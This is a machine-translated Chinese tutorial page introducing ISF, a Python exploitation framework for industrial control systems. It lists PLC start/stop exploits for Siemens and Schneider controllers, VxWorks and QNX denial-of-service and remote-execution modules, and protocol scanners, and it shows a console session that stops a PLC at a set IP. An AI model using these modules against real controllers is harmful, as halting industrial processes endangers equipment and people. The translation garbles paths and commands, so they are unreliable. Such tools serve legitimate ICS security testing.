# ISF:工业控制系统开发框架

> 原文：<https://kalilinuxtutorials.com/industrial-control-system/>

**ISF** (工控系统开发框架)，基于 Python 的开发框架。工业控制系统基于开源项目 [routersploit](https://github.com/reverse-shell/routersploit) 。

**ICS 协议客户端**

| 名字 | 小路 | 描述 |
| --- | --- | --- |
| modbus _ tcp _ 客户端 | ics sploit/clients/Modbus _ TCP _ client . py | Modbus-TCP 客户端 |
| wdb2 _ 客户端 | ics sploit/clients/wd B2 _ client . py | WdbRPC 版本 2 客户端(Vxworks 6.x) |
| s7 _ 客户端 | icssploit/clients/s7_client.py | s7comm 客户端(S7 300/400 PLC) |

**又读-[Darksplitz:漏洞利用框架](https://kalilinuxtutorials.com/darksplitz/)**

**漏洞利用模块**

| 名字 | 小路 | 描述 |
| --- | --- | --- |
| s7 _ 300 _ 400 _ plc _ 控制 | exploits/PLC/西门子/s7_300_400_plc_control.py | S7-300/400 PLC 启动/停止 |
| s7 _ 1200 _ plc _ 控制 | exploits/PLC/西门子/s7_1200_plc_control.py | S7-1200 PLC 启动/停止/复位 |
| vxworks_rpc_dos | exploits/PLC/VxWorks/VxWorks _ RPC _ dos . py | Vxworks RPC 远程 dos(CVE-2015-7599) |
| 量子 _ 140 _ plc _ 控制 | exploits/PLC/schneider/quantum _ 140 _ PLC _ control . py | 施耐德 Quantum 140 系列 PLC 启动/停止 |
| 崩溃 _ qnx _ inetd _ tcp _ 服务 | exploits/PLC/QNX/crash _ QNX _ inetd _ TCP _ service . py | QNX Inetd TCP 服务 dos |
| qconn _ 远程 _ 执行 | exploits/PLC/QNX/qconn _ remote _ exec . py | QNX qconn 远程代码执行 |
| profinet_set_ip | exploits/PLC/Siemens/ProFi net _ set _ IP . py | Profinet DCP 设备 IP 配置 |

**扫描仪模块**

| 名字 | 小路 | 描述 |
| --- | --- | --- |
| profinet_dcp_scan | 扫描仪/profinet_dcp_scan.py | Profinet DCP 扫描仪 |
| vxworks_6_scan | 扫描仪/vxworks_6_scan.py | Vxworks 6.x 扫描仪 |
| s7comm_scan | scanners/s7comm_scan.py | S7comm 扫描仪 |
| enip_scan | 扫描仪/enip_scan.py | 以太网 IP 扫描仪 |

**ICS 协议模块(Scapy 模块)**

这些协议可以用在其他模糊框架中，如 [Kitty](https://github.com/cisco-sas/kitty) 或者创建你自己的客户端。

| 名字 | 小路 | 描述 |
| --- | --- | --- |
| pn_dcp | icssploit/protocols/pn_dcp | Profinet DCP 协议 |
| modbus_tcp | icssploit/protocols/modbus_tcp | Modbus TCP 协议 |
| wdbrpc2 | icssploit/protocols/wdbrpc2 | WDB RPC 版本 2 协议 |
| s7comm | icssploit/protocols/s7comm.py | S7comm 协议 |

**安装**

**Python 需求**

*   gnureadline(仅限 OSX)
*   要求
*   帕拉马里科
*   beautifulsoup4
*   pysnmp
*   python-nmap
*   scapy [我们建议将 scapy 手册与此正式文件一起安装](http://scapy.readthedocs.io/en/latest/installation.html)

**安装在 Kali 上**

**git 克隆 https://github . com/dark-LBP/ISF/
ISF CD
python ISF . py**

**用途**

**root @ kali:~/Desktop/temp/ISF # python ISF . py
ICS exploit 框架【】注:ICSSPOLIT 是从 routersploit at
【】开发团队:朱(dark-lbp)
版本:0.1.0

漏洞:2 个扫描器:0 个 Creds: 13 个
ICS 漏洞:
PLC: 2 个 ICS Switch: 0
软件:0
isf >**

**战功**

**isf >利用漏洞/PLC/
漏洞/PLC/西门子/漏洞/PLC/VxWorks/
ISF>利用漏洞/PLC/西门子/s7_300_400_plc_control
漏洞/PLC/西门子/S7 _ 300 _ 400 _ PLC _ Control
ISF>利用漏洞/PLC/西门子/S7 _ 300 _ 400 _ PLC _ Control
ISF(S7-300**

您可以使用 tab 键来完成。

**选项**

**显示模块选项:**

**isf (S7-300/400 PLC 控制)>显示选项
目标选项:
名称电流设置描述
————————————————
目标目标地址例如 192.168.1.1
端口 102 目标端口
模块选项:
名称电流设置描述
——————————————
插槽 2 CPU 插槽号。
命令 1 命令 0:启动 plc，命令 1:停止 plc。
isf (S7-300/400 PLC 控制)>**

**设置选项**

**isf (S7-300/400 PLC 控制)>设定目标 192 . 168 . 70 . 210
[+]{ ' target ':' 192 . 168 . 70 . 210 ' }**

**运行模块**

isf (S7-300/400 PLC 控制) >运行
[]运行模块… [+]目标处于活动状态[]向目标发送数据包
[*]停止 plc
isf (S7-300/400 PLC 控制)>

**显示漏洞利用信息**

**isf (S7-300/400 PLC 控制)>显示信息

名称:
S7-300/400 PLC 控制

描述:
使用 S7comm 命令启动/停止 PLC。

设备:
西门子 S7-300 和 S7-400 可编程逻辑控制器

作者:
朱

参考文献:
isf (S7-300/400 PLC 控制)>**

[**Download**](https://github.com/dark-lbp/isf)